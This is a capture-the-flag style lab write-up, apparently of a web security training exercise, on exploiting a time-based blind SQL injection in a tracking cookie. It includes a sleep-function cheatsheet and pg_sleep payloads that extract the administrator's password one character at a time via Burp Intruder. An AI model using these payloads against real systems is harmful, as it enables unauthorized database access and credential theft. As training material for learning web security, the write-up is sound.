# Description
This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.

The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows or causes an error. However, since the query is executed synchronously, it is possible to trigger conditional time delays to infer information.

The database contains a different table called `users`, with columns called `username` and `password`. You need to exploit the blind SQL injection vulnerability to find out the password of the `administrator` user.

To solve the lab, log in as the `administrator` user.
# Solution
## Cheatsheet
You can cause a time delay in the database when the query is processed. The following will cause an unconditional time delay of 10 seconds.

| DB         | Description                           |
| ---------- | ------------------------------------- |
| Oracle     | `dbms_pipe.receive_message(('a'),10)` |
| Microsoft  | `WAITFOR DELAY '0:0:10'`              |
| PostgreSQL | `SELECT pg_sleep(10)`                 |
| MySQL      | `SELECT SLEEP(10)`                    |
1) **Verify the application takes time delays:**
```
' || SELECT pg_sleep(10)
```

```
'; SELECT CASE WHEN (1=1) THEN pg_sleep(10) END--
```
=> Response with 10s delay.

```ad-note
The string, function (`pg_sleep()`,...) , statement (`SELECT` ...) have to be connected with concatenation ( `||`, `+`, ...) or `;` (start new statement) or operator (`AND`, `OR`) or `UNION` after closing `'`.
```

2) Confirm the administrator user.
```
'; SELECT CASE WHEN (username='administrator') THEN pg_sleep(10) END FROM users--
```
=> Response with 10s delay -> confirm.

3) Determine the length of password.
```
'; SELECT CASE WHEN (LENGTH(password)>1) THEN pg_sleep(10) END FROM users--
```
=> Response with 10s delay -> it works.

- Try with **sniper attack** on Intruder:
```
'; SELECT CASE WHEN (username='administrator' AND LENGTH(password)>$1$) THEN pg_sleep(1) ELSE pg_sleep(0) END FROM users--
```

![](../../Image/Pasted%20image%2020250516235144.png)

=> Confirm the length is 20 as returning normal after it.

```ad-note
To observe more obviously, you can change the resource pool, set to 1 thread not 10 threads (default).
```

4) **Specify the password**
```
'; SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,$1$,1)='a') THEN pg_sleep(1) ELSE pg_sleep(0) END FROM users--
```

![](../../Image/Pasted%20image%2020250517000407.png)

=> administrator:vppqxdfgetrg2kgyiqmw